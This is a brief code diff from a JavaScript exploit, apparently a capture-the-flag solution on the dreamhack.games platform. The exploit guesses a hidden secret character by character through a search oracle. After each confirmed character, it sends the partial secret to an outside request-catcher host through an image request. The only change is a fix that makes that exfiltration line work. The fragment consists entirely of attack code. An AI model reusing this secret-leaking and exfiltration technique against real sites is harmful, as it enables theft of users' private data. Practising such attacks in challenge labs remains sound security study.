@@ -42,7 +42,7 @@
                     for (let c of chars) {
                         if (await search(secret + c)) {
                             secret += c;
-                            new image().src = `https://pdvsomq.request.dreamhack.games?secret=${secret}`;
+                            new Image().src = `https://pdvsomq.request.dreamhack.games?secret=${secret}`;
                             console.log(`found: ${secret}`);
                             found = true;
                             break;
